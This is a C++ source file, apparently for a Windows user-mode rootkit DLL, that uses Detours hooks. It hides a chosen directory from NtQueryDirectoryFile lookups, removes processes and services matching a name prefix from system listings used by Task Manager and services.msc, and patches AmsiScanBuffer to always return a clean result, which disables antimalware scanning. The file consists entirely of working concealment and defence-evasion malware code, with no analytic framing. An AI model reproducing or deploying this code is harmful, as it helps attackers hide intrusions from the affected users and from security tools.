#include "pch.h"
#include "requirements.h"

static typedefNtQuerySystemInformation originalNtQuerySystemInformation;
static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;
static typedefEnumServiceGroupW originalEnumServiceGroupW;
static typedefEnumServicesStatusExW originalEnumServicesStatusExW;
static typedefAmsiScanBuffer originalAmsiScanBuffer;

BOOL StartHook() {
	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	HMODULE advapi32Handle = GetModuleHandleA("Advapi32.dll");
	HMODULE amsiHandle = GetModuleHandleA("amsi.dll");
	originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
	originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
	originalNtQuerySystemInformation = (typedefNtQuerySystemInformation)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
	originalEnumServiceGroupW = (typedefEnumServiceGroupW)GetProcAddress(advapi32Handle, "EnumServiceGroupW");
	originalEnumServicesStatusExW = (typedefEnumServicesStatusExW)GetProcAddress(advapi32Handle, "EnumServicesStatusExW");
	originalAmsiScanBuffer = (typedefAmsiScanBuffer)GetProcAddress(amsiHandle, "AmsiScanBuffer");


	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourAttach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourAttach(&(PVOID&)originalNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourAttach(&(PVOID&)originalEnumServiceGroupW, HookedEnumServiceGroupW);
	DetourAttach(&(PVOID&)originalEnumServicesStatusExW, HookedEnumServicesStatusExW);
	DetourAttach(&(PVOID&)originalAmsiScanBuffer, HookedAmsiScanBuffer);
	LONG err = DetourTransactionCommit();

	return 0;
}

BOOL StopHook() {
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourDetach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourDetach(&(PVOID&)originalNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourDetach(&(PVOID&)originalEnumServiceGroupW, HookedEnumServiceGroupW);
	LONG err = DetourTransactionCommit();

	return 0;
}

static HRESULT WINAPI HookedAmsiScanBuffer(HAMSICONTEXT context, void* buffer, ULONG length, const WCHAR* name, HAMSISESSION session, AMSI_RESULT* result) {
	return AMSI_IS_SAFE;
}

static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
	NTSTATUS status = STATUS_NO_MORE_FILES;
	WCHAR dirPath[MAX_PATH + 1] = { 0 };

	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {

		if (StrStrIW(dirPath, HIDE_PATH))
			RtlZeroMemory(FileInformation, Length);
		else
			status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	}

	return status;
}

static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
	NTSTATUS status = STATUS_NO_MORE_FILES;
	WCHAR dirPath[MAX_PATH + 1] = { 0 };

	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {

		if (StrStrIW(dirPath, HIDE_PATH))
			RtlZeroMemory(FileInformation, Length);
		else
			status = originalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
	}
	return status;
}

static NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (SystemInformationClass == SystemProcessInformation) {

		SYSTEM_PROCESS_INFORMATION* cur = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
		SYSTEM_PROCESS_INFORMATION* prev = NULL;

		while (cur) {
			if (CheckPrefix(cur->ImageName.Buffer)) {
				if (!prev) {
					if (cur->NextEntryOffset) SystemInformation = (LPBYTE)SystemInformation + cur->NextEntryOffset;
					else {
						SystemInformation = NULL;
						break;
					}
				}
				else {
					if (cur->NextEntryOffset) prev->NextEntryOffset += cur->NextEntryOffset;
					else
						prev->NextEntryOffset = 0;
				}
			}
			else prev = cur;

			if (cur->NextEntryOffset) cur = (SYSTEM_PROCESS_INFORMATION*)((LPBYTE)cur + cur->NextEntryOffset);
			else break;
		}

	}

	return status;
}

static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
{
	// services.msc
	BOOL result = originalEnumServiceGroupW(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, reserved);

	if (result && services && servicesReturned)
	{
		LPENUM_SERVICE_STATUSW serviceStatus = (LPENUM_SERVICE_STATUSW)services;
		DWORD currentIndex = 0;

		for (DWORD i = 0; i < *servicesReturned; i++)
		{
			if (!CheckPrefix(serviceStatus[i].lpServiceName))
			{
				serviceStatus[currentIndex] = serviceStatus[i];
				currentIndex++;
			}
		}
		*servicesReturned = currentIndex;
	}

	return result;
}

static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
{
	// Taskmgr.exe
	BOOL result = originalEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);

	if (result && services && servicesReturned)
	{
		LPENUM_SERVICE_STATUS_PROCESSW serviceStatus = (LPENUM_SERVICE_STATUS_PROCESSW)services;
		DWORD currentIndex = 0;

		for (DWORD i = 0; i < *servicesReturned; i++)
		{
			if (!CheckPrefix(serviceStatus[i].lpServiceName))
			{
				serviceStatus[currentIndex] = serviceStatus[i];
				currentIndex++;
			}
		}
		*servicesReturned = currentIndex;
	}

	return result;
}